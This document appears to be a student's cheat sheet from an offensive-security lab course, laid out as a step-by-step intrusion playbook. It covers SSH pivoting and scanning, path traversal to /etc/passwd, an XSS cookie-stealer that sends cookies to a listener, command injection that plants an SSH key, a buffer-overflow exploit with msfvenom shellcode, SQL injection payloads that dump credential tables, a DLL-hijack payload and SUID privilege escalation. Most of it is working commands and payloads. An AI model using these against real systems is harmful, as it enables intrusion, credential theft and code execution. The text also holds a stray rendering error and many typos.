Disclaimer: Don't close terminals while doing sockets. It can close ALL your sockets TIP: Sudo bash can change you into root. use it when possible SSHing using MS ssh -MS /tmp/jmp demo1@10.50.11.225 Explanation: /tmp/jmp is the name of the socket file, we are sshing to our jump box Grabbing ports Ping sweep - we don't know what boxes are up Use duckduckgo.com to brown down CIDR notation for i in {97..126}; do (ping -c 1 192.168.28.$i | grep "bytes from" &); done After open new terminal Setup dynamic port foward. Using the /tmp/jmp file. -O for options. ssh -S /tmp/jmp jmp -O forward -D 9050

Enumrate IPs and ports ss -ntlp: see if connection is still up Scan the network from the Box (Port Enumeration) proxychains nmap 10.208.50.42,61,200,203 Check the IP's and ports. Press enter again if it does nothing proxychains nc 10.208.50.42 <"ports"> Local port forward onto ports found ssh -S /tmp/jmp jmp -O forward -L 1112:10.208.50.42:80

Web Enumeration Browse to /robots.txt on google, proxychains nmap --script=http-enum 10.208.50.42 -p 80

On a website if you see "myfile=" that allows you to transfer around its directory with linux commands: myfile=../../../../../../etc/passwd myfile=../../../../../../etc/hosts

Create new MS (Master Socket) to hop onto the next machine ssh-ing to new target with creds using out local port connected to remote port jmp box: -> T1:10.208.50.42:22

    ssh -S /tmp/jmp jmp -O forward -L 1113:10.208.50.42:22
    ssh -MS /tmp/t1 <"creds">@localhost -p 1113
    (Run ping sweep again if needed)

    
    **Creating a new MS for ssh 2nd example:**
    ssh -S /tmp/jmp jmp -O forward -L 1122:10.208.50.42:22 
    ssh -MS /tmp/t1 <"creds">@127.0.0.1 -p 1122
Port forwarding through control socket. Creds are not needed because of the connection on we have to box that can see where are we forwarding to .100 not 170 2 ways: ssh -S /tmp/t1 t1 -O forward -D 9050 ssh -MS /tmp/t1 <"creds">@127.0.0.1 -p 1112 -D 9050 (Dynamic tunnel) Cross Site Scripting and SSH key gen Cookie stealer for XSS Cross scripting On a website do: <script>document.location="http://:/Cookie_Stealer1.php?username=" + document.cookie;</script>

From remote IP (IP you have access to), setup listener: nc -k -l <'ip of the LINOPS machine'>

SSH Key gen SSH key gen/generate your key (from linops): ssh-keygen -t rsa -b 4096 (press enter when prompted) On website or remote location (make .ssh directory on websites $HOME)

    ; mkdir /home/billybob/.ssh && echo done(Replace billybob with your user on whatever machine your on)

    ; ls -la /home/billybob && echo done( This is an example, look at their home directory ; ls -la /home/___)
Upload our key using cmd inject cat $HOME/.ssh/id_rsa.pub #FROM LINOPS

From wesbite: ; echo <paste whole .pub key> > /home/billybob/.ssh/authorized_keys ; cat /home/billybob/.ssh/authorized_keys

Make ssh for the -MS connection to port into Here we are using T1 which is the .50.42 ssh -S /tmp/demo demo -O forward -L 42072:10.208.50.42:2222 ssh -S /tmp/demo demo -O cancel -L 42072:10.208.50.42:2222 (cancel if needed) You don't need to do this step if you can already ssh into it

ssh into the new box using the key Make new master socket: ssh -MS /tmp/gump -i $HOME/.ssh/id_rsa www-data@localhost -p 42070

Make an ssh -MS connection to port Make a dynamic port to new Master socket ssh -S /tmp/gump gump -O forward -D 9050 (make sure your previous dyanmic tunnel is closed) Do any enumartion on here: proxychains nmap, nc

Make a new ssh tunnel ssh -S /tmp/NEW-S(gump) (random name) -O forward -L 42073:10.208.50.42:22

Exploit Development Static Analysis 1. file func 2. strings func | more Check to see if strcpy is there since it tells you theres buffer overflows, it will let you go do the next steps

Behavioral Analysis # run the file # chmod u+x function # ./func

Dyanmic Analysis Do this to see if the function accept triple gators or no gators: 1. ./func 
You can't use 'macro parameter character #' in math mode
$(echo "12345") ## allows us to pass 12345 as a parameter
2. ./func &lt;&lt;&lt;$(echo "12345") ## simulates user input Go into gdb: 3. gdb ./func 4. shell and exit to go back 5. file to check if there is a file, load a file by typing "file ./func" 6. info functions

Disassembly Inside gdb-peda: 1. disass main or pdisass main 2. pdisass getuserinput or disass getuserinput Disclaimer: use the one that functions and gives and output Find the red call text

Dynamic Analysis part 2 Fuzzing Do this in terminal: ./func <<<$(python linbuf.py) #Take out gators if it doesn't work find offset: offset = "A" * 100

Pinpoint or find EIP, using wiremask Brute Force method -Run script in gdb: run <<<$(python linbuf.py) #Take out gators if it doesn't work -Pintpoint or find EIP, by raising or decreasing the offset to get BBBB: offset = "A" * 62 (BBBB was found with an offset of 62) eip = "BBBB"

print(offset + eip)
2nd method - Overflow the process: -Use wiremask string length of 100: Comment out the offset = "A" * 62 -> replace the offset with: offset = "Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A" -> run this script in gdb: run <<<$(python linbuf.py)

find JMP ESP -> find EIP In GDB on the TARGETS MACHINE -shell(Go to Terminal) -> env - gdb ./func -Commnds: unset env LINES -> unset env COLUMNS -> show env -start -> step through program with "step" -info proc map (might need to "file ./func" then start and info proc map again)

Overflow the buffer (Manning's way) -shell(Go to Terminal) -> env - gdb ./func -Commnds: unset env LINES -> unset env COLUMNS -> show env - run $(python2.7 -c "print 'A' * sizeOverBuffer) - In this example you would put 63 for sizeOverBuffer -info proc map (might need to "file ./func" then start and info proc map again)

Goal: type step until you see [heap] and [stack]
Once Found Heap and Stack -find /b <1st addr after heap>,,0xff,0xe4

EXAMPLE: find /b 0xf7de1000,0xffffe0000,0xff,0xe4 (the first 2 will change, the last 2 will not, the first 1 is after the heap the second one is the last address)

-Copy first 5 addresses into your notes

-Add to script NOP and replace EIP
-convert to little endian f7 de 3b 59 > "\x59\x3b\xde\xf7"

Script should look like this:
offset = "A" * 62
eip = "\x59\x3b\xde\xf7"
nop = "\x90" * 15
print(offset + eip + nop)
Create msfvenom On linops msfvenom -p linux/x86/exec CMD="whoami" -b "\x00\xfe\x20\x0a\xff" -f python #Change the CMD to whatever command you need

Copy the all payloads in python script:
buf =  b""
buf += b"\xdd\xc4\xd9\x74\x24\xf4\x5f\xbd\x89\x90\x3f\x8f"
buf += b"\x2b\xc9\xb1\x0b\x31\x6f\x19\x83\xc7\x04\x03\x6f"
buf += b"\x15\x6b\x65\x55\x84\x33\x1f\xf8\xfc\xab\x32\x9e"
buf += b"\x89\xcc\x25\x4f\xf9\x7a\xb6\xe7\xd2\x18\xdf\x99"
buf += b"\xa5\x3f\x4d\x8e\xb1\xbf\x72\x4e\xc9\xd7\x1d\x2f"
buf += b"\x58\x4e\xe2\xf8\xf1\x19\x03\xcb\x76"

print(offset + eip + nop + buf)
#from terminal: ./func <<<$(python linbuf.py) 
Put script onto other box If your task is on another box: SCP your python script from comrade and grab it from linops:

scp student@10.50.187.68:/home/student/Downloads/python.py . #do it on home directory
Run the python script: sudo /.hidden/inventory.exe <<<$(python ~/python.py)
SQL Injection Blind Injection (Identify vulnerable field) Audi 'OR 1='1 # (Usuaully used in username and passswods, Audi is the vunerable field, the # is sometimes needed to comment out the back)

    TIP: In the inspector field if you change the method to get your Audi 'OR 1='1 output different results. 
Identify the number of columns Audi 'UNION SELECT 1,2,3,4 # (The numbers represent how many columns you want to see, again the # key might sometimes be needed)

Golden Statement Audi 'UNION SELECT 1,2,table_schema,table_name,column_name FROM information_schema.columns; #

Explanation: UNION SELECT column_name,column_name FROM database.table Craft Queries Examples: Audi 'UNION SELECT 1,2,table_schema,4,5 FROM information_schema.columns; #

Audi 'UNION SELECT 1,2,username,passwd,jump FROM session.userinfo; #

Audi 'UNION SELECT 1,2,id,name,pass FROM session.user; #

Audi 'UNION SELECT 1,2,plugin_name,4,5 FROM information_schema.all_plugins; #
Explanation: The DATABASE is from the first column and TABLES are in the last columns. The information you want is in the middle column <"infomation you want">,1,2 FROM database.table (Before the FROM you need to put the exact number of columns it wants ot else it won't work) SQL Injection GET Blind Injection (Identify Vulnerable Field) http://127.0.0.1:6767/uniondemo.php?Selection=1 OR 1=1 Change The Selection number to see which number is the vulnerable one It doesn't only have to be selection it can be named product or something else. Identify Number of Columns http://127.0.0.1:6767/uniondemo.php?Selection=2 UNION SELECT 1,2,3 Explanation: 2 was shown to be the vulnerable number and 1,2,3 are the number of columns shown. Golden Statement http://127.0.0.1:6767/uniondemo.php?Selection=2 UNION SELECT table_schema,column_name,table_name FROM information_schema.columns Craft Queries http://127.0.0.1:6767/uniondemo.php?Selection=2 UNION SELECT column_name,column_name,column_name FROM database.table column_name is the information you want Example: http://127.0.0.1:7890/cases/productsCategory.php?category= UNION SELECT comment,data,id FROM sqlinjection.share4 Explanation: The DATABASE is from the first column and TABLES are in the last columns. The information you want is in the middle column <"infomation you want">,1,2 FROM database.table (Before the FROM you need to put the exact number of columns it wants ot else it won't work) Windows Privilege Escalation Static Analysis (use regedit) -> check in run keys for HKCU and HKLM -> Look for anything odd Services In your taskbar type services -> look for anything odd, to enumerate right click and press propterties -> common things to look for: In the description: anything empty If your in a suspicious directory click on view on the top and check mark the hidden files. System Access and Defeating Proctection Task Scheduler Look at triggers/actions (Can dig into directory that is set to run to upload/replace dlls or exe's) Audit logging CMD/PS commands: auditpol /get /category:* -> search for success/failure Specific command: auditpol /get /category:* | findstr /i "Success Failure" DLL Hijacking download putty.exe from resources procmon /accepteula Process monitor: Process name -> putty.exe path -> .dll reseult -> NAME NOT FOUND identify .dll to alter Run on linux: msfvenom -p windows/exec CMD='cmd.exe /C "whoami" > C:\Users\student\Desktop\whoami.txt' -f dll > SSPOCLI.dll

Once created, SCP to your target machine (On the RDP machine) scp student@<'LIN OPS IP'>:/home/student/SSPICLI.dll C:\Users\student\Doucments\putty

Explanation: C:\Users\student\Desktop\whoami.txt is where you are sending the command you did to enumerate the .dll. You will need to scp it and restart your machine in order to see that file. DLLs are read at boot up thats why you need to restart Run putty again if you need too (This was for the demo you probably don't got to do it) To look for other DLL there is a registry key for that: HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs Linux Privilege Escalation Permissions Sudo Permissions: sudo -l Look for User: may run following commands

SUID/SGID bits find / -type f -perm /4000 -ls 2>/dev/null # find SUID only files find / -type f -perm /2000 -ls 2>/dev/null # find SGID only files find / -type f -perm /6000 -ls 2>/dev/null # find SUID and/or SGID files

Go to GTFObins.org -> search for commands you found from the top commands 
-Start searching on sudo -l commands 
-If there are none, start with top/bottom 3 SUID/SGID commands 
-Once you find a command that has SUID/SGID bit set 
go back to GTFObins and find the command  listed under the respective tabs run the command
Dot "." in the path echo $PATH Identified the Path Variables

PATH = .:/sbin:/bin:/usr/bin:/usr/local/bin:/snap/bin OR
PATH = .:$PATH

The dot at the beginning is saying look at my current directory

cd `printf "/var/tmp\n/tmp\n" | sort -R | head -n 
1` ;ls 
RDP into another machine #from Op station specify local listening port on RHP (Random High Port): ssh student@<JMP_IP> -L RHP:10.10.28.45:3389

#from Op station point xfreerdp to new local listening tunnel:
xfreerdp /u:student /v:localhost:RHP /dynamic-resolution +clipboard
Example: ssh user2@10.50.18.4 -L 1115:192.168.28.189:3389 proxychains xfreerdp /u:Aaron /v:192.168.28.189 /dynamic-resolution +clipboard

Something cool mysql --user=webuser --pass=sqlpass
